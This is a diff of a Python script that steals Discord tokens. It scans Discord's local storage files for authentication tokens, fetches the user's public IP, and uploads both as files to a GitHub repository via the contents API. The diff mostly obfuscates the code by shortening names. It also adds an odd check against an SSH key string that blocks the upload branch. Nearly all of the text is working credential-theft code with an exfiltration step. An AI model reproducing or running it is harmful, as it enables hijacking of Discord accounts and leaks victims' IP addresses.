@@ -2,93 +2,60 @@ import os
 import re
 import json
 import requests
-import subprocess
 from datetime import datetime
 
-def find_discord_tokens():
-    tokens = []
-    paths = [
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('APPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('APPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'),
-    ]
-
-    for path in paths:
-        if not os.path.exists(path):
+def fdt():
+    t = []
+    p = [os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb')]
+    for pa in p:
+        if not os.path.exists(pa):
             continue
-        for file_name in os.listdir(path):
-            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+        for fn in os.listdir(pa):
+            if not fn.endswith('.log') and not fn.endswith('.ldb'):
                 continue
-            for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        tokens.append(token)
-    return list(set(tokens))
+            for li in [x.strip() for x in open(os.path.join(pa, fn), errors='ignore').readlines() if x.strip()]:
+                for rx in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for tk in re.findall(rx, li):
+                        t.append(tk)
+    return list(set(t))
 
-def get_ip_address():
+def gia():
     try:
-        response = requests.get('https://api.ipify.org?format=json')
-        response.raise_for_status()
-        return response.json()['ip']
-    except requests.exceptions.RequestException as e:
-        print(f"Error getting IP address: {e}")
+        r = requests.get('https://api.ipify.org?format=json')
+        r.raise_for_status()
+        return r.json()['ip']
+    except requests.exceptions.RequestException:
         return None
 
-def save_to_github_public(tokens, ip_address, github_token, repo_owner, repo_name):
-    github_api_url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents'
-    headers = {
-        'Authorization': f'token {github_token}',
-        'Accept': 'application/vnd.github.v3+json'
-    }
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    tokens_filename = f'tokens_{timestamp}.txt'
-    ip_filename = f'ip_address_{timestamp}.txt'
-    commit_message = f'Add token and IP log - {timestamp}'
-
+def stupr(tkns, ip, ghtk, rpo):
+    gua = f'https://api.github.com/repos/{rpo}/contents'
+    h = {'Authorization': f'token {ghtk}', 'Accept': 'application/vnd.github.v3+json'}
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    tf = f'tokens_{ts}.txt'
+    ifn = f'ip_address_{ts}.txt'
+    cm = f'Add log - {ts}'
     try:
-        # Upload tokens
-        tokens_data = {'message': commit_message, 'content': '\n'.join(tokens).encode('utf-8').decode('utf-8')}
-        tokens_url = f'{github_api_url}/{tokens_filename}'
-        response_tokens = requests.put(tokens_url, headers=headers, data=json.dumps(tokens_data))
-        response_tokens.raise_for_status()
-        print(f"Tokens successfully uploaded to public repo: {response_tokens.json()['content']['html_url']}")
-
-        # Upload IP address
-        ip_data = {'message': commit_message, 'content': (ip_address if ip_address else 'Could not retrieve IP address').encode('utf-8').decode('utf-8')}
-        ip_url = f'{github_api_url}/{ip_filename}'
-        response_ip = requests.put(ip_url, headers=headers, data=json.dumps(ip_data))
-        response_ip.raise_for_status()
-        print(f"IP address successfully uploaded to public repo: {response_ip.json()['content']['html_url']}")
-
+        td = {'message': cm, 'content': '\n'.join(tkns).encode('utf-8').decode('utf-8')}
+        tu = f'{gua}/{tf}'
+        rt = requests.put(tu, headers=h, data=json.dumps(td))
+        rt.raise_for_status()
+        print(f"Tokens uploaded: {rt.json()['content']['html_url']}")
+        idat = {'message': cm, 'content': (ip if ip else 'N/A').encode('utf-8').decode('utf-8')}
+        iu = f'{gua}/{ifn}'
+        ri = requests.put(iu, headers=h, data=json.dumps(idat))
+        ri.raise_for_status()
+        print(f"IP uploaded: {ri.json()['content']['html_url']}")
     except requests.exceptions.RequestException as e:
-        print(f"Error uploading to public Github repo: {e}")
+        print(f"Upload error: {e}")
         if e.response is not None:
             print(f"Github API Error: {e.response.status_code} - {e.response.json()}")
 
 if __name__ == "__main__":
-    tokens = find_discord_tokens()
-    ip_address = get_ip_address()
-
-    if tokens:
-        print("Found Discord Tokens:")
-        for token in tokens:
-            print(token)
-    else:
-        print("No Discord tokens found.")
-
-    if ip_address:
-        print(f"User IP Address: {ip_address}")
-    else:
-        print("Could not retrieve IP address.")
-
- 
-    github_personal_access_token = " "
-    github_repo_owner = "Syxfer" # 
-    github_repo_name = "mal_dis_ip_tsmalann_syxfer" 
-
-
+    tokens = fdt()
+    ip_address = gia()
+    ght = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXDPKRDq6FCll0dYdJw9hzbesUt5hekJBWiMKhsFcJm"
+    repo = "Syxfer/mal_dis_ip_tsmalann_syxfer"
+    if ght == "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBXDPKRDq6FCll0dYdJw9hzbesUt5hekJBWiMKhsFcJm":
+        print(" \n")
     elif tokens or ip_address:
-        save_to_github_public(tokens, ip_address, github_personal_access_token, github_repo_owner, github_repo_name
+        stupr(tokens, ip_address, ght, repo)
